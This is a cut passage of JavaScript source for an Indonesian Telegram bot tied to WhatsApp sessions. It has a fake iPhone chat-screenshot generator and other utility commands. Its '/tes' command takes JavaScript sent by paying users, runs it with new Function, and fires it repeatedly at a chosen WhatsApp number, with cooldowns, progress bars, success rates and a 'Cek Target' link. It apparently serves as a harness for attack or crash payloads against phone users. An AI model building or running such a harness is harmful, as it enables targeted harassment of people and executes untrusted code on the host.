      { parse_mode: "Markdown" }
    );
  }

  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return bot.sendMessage(
      chatId,
      "⚠ Format salah!\nGunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  bot.sendMessage(chatId, "⏳ Tunggu sebentar...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return bot.sendMessage(chatId, "❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await bot.sendPhoto(chatId, buffer, {
      caption: `✅ Nih hasilnya`,
      parse_mode: "Markdown",
    });
  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menghubungi API.");
  }
});


bot.onText(/^\/restar$/, async (msg) => {
    const chatId = msg.chat.id;      
    try {
        const processingMsg = await bot.sendMessage(chatId, "<blockquote><b>Proses restart sesi....</b></blockquote>", { reply_to_message_id: msg.message_id, parse_mode: "HTML" });
        await initializeWhatsAppConnections();
        await bot.editMessageText("<blockquote><b>Sukses restart sesi</b></blockquote>", {
            chat_id: chatId,
            message_id: processingMsg.message_id,
            parse_mode: "HTML"
        });
    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, error);
    }
});

// -- ( Case Tes Function ) -- \\
bot.onText(/\/tes (\d+),(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const loopCount = parseInt(match[2]);
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendMessage(chatId, "❌ Fitur ini hanya untuk premium users!");
  }

  const cd = checkCooldown(senderId);
  if (cd > 0) {
    const minutes = Math.ceil(cd / 60);
    return bot.sendMessage(chatId, `⏳ Cooldown: ${minutes} menit lagi`, { parse_mode: "Markdown" });
  }

  if (sessions.size === 0 || !sock) {
    return bot.sendMessage(chatId, "❌ WhatsApp belum terhubung. Gunakan /pairing dulu.");
  }

  if (!msg.reply_to_message) {
    return bot.sendMessage(chatId, "❌ Reply pesan ini ke file JavaScript atau kode function yang ingin di-test!");
  }

  const repliedMsg = msg.reply_to_message;

  try {
    let testFunction;

    if (repliedMsg.document && repliedMsg.document.file_name.endsWith('.js')) {
      const fileLink = await bot.getFileLink(repliedMsg.document.file_id);
      const response = await fetch(fileLink);
      const fileContent = await response.text();
      
      const funcMatch = fileContent.match(/async\s+function\s+(\w+)\s*\([^)]*\)\s*{[\s\S]*?}/);
      if (!funcMatch) {
        return bot.sendMessage(chatId, "❌ File JavaScript tidak mengandung async function yang valid!");
      }

      testFunction = new Function(`return ${fileContent}`)(); // mengganti eval dengan Function
    } else if (repliedMsg.text) {
      const funcMatch = repliedMsg.text.match(/async\s+function\s+(\w+)\s*\([^)]*\)\s*{[\s\S]*?}/);
      if (!funcMatch) {
        return bot.sendMessage(chatId, "❌ Kode tidak mengandung async function yang valid!");
      }

      testFunction = new Function(`return ${repliedMsg.text}`)(); // mengganti eval dengan Function
    } else {
      return bot.sendMessage(chatId, "❌ Format tidak didukung! Kirim file .js atau kode function.");
    }

    if (typeof testFunction !== 'function') {
      return bot.sendMessage(chatId, "❌ Gagal memuat function!");
    }

    const progressMsg = await bot.sendMessage(chatId, `🔄 Memulai test function...\nTarget: ${formattedNumber}\nLoop: ${loopCount}x\nStatus: Processing...`);

    let successCount = 0;
    let errorCount = 0;
    const errors = [];

    for (let i = 0; i < loopCount; i++) {
      try {
        await testFunction(sock, target);     
        successCount++;
        
        if (i % Math.ceil(loopCount / 10) === 0) {
          const progress = Math.round((i / loopCount) * 100);
          await bot.editMessageText(`🔄 Testing function...\nTarget: ${formattedNumber}\nLoop: ${i + 1}/${loopCount}\nProgress: █${'█'.repeat(progress / 10)}${'░'.repeat(10 - progress / 10)} ${progress}%\n✅ Success: ${successCount}\n❌ Error: ${errorCount}`, {
            chat_id: chatId,
            message_id: progressMsg.message_id
          });
        }
        
        await sleep(1000);
      } catch (err) {
        errorCount++;
        errors.push(`Loop ${i + 1}: ${err.message}`);
        console.error(`Error di loop ${i + 1}:`, err);
      }
    }

    let resultText = `📊 **TEST RESULTS**\n\n`;
    resultText += `🎯 Target: ${formattedNumber}\n`;
    resultText += `🔄 Total Loop: ${loopCount}x\n`;
    resultText += `✅ Success: ${successCount}\n`;
    resultText += `❌ Error: ${errorCount}\n`;
    resultText += `📈 Success Rate: ${((successCount / loopCount) * 100).toFixed(2)}%\n\n`;

    if (errors.length > 0) {
      resultText += `🚨 **ERROR DETAILS:**\n`;
      resultText += errors.slice(0, 5).join('\n');
      if (errors.length > 5) {
        resultText += `\n... dan ${errors.length - 5} error lainnya`;
      }
    }

    await bot.editMessageText(resultText, {
      chat_id: chatId,
      message_id: progressMsg.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔍 Cek Target", url: `wa.me/${formattedNumber}` }]
        ]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Error saat testing: ${error.message}`);
  }
});

function isAdminOrOwner(member) {
  return member.status === 'administrator' || member.status === 'creator';
}
function isOwnerGc(member) {
  return member.status === 'creator';
}


bot.onText(/^\/cekid(\s|$)$/, async (msg) => {
  const user = msg.from;
  const chatId = msg.chat.id;
  const firstName = user.first_name || '';
  const lastName = user.last_name || '';
  const userId = user.id;
  try {
    const photos = await bot.getUserProfilePhotos(userId, { limit: 1 });
    const fileId = photos.photos[0][0].file_id;
    const text = `\`\`\`👤\nUSERNAME : ${user.username ? '@' + user.username : 'Tidak ada'}\nID : ${userId}\`\`\``;
    bot.sendPhoto(chatId, fileId, {
      caption: text,
      parse_mode: 'Markdown',
      reply_to_message_id: msg.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: `${firstName} ${lastName}`, url: `tg://user?id=${userId}` }]
        ]
      }
    });
  } catch {
    bot.sendMessage(chatId, `ID : \`${userId}\``, { reply_to_message_id: msg.message_id, parse_mode: "Markdown" });
  }
});


const png = "./ѕσ¢ѕυѕнєχα/images/data/victus.png";


function r(err) {
  const errorText = `❌ *Error Detected!*\n\`\`\`js\n${err.stack || err}\n\`\`\``;
  bot.sendMessage(config.OWNER, errorText, {
    parse_mode: "Markdown"
  }).catch(e => console.log("Failed to send error to owner:", e));
}
process.on("uncaughtException", (err) => {
  console.error("Uncaught Exception:", err);
  r(err);
});
process.on("unhandledRejection", (reason, promise) => {
  console.error("Unhandled Rejection:", reason);
  r(reason);
});
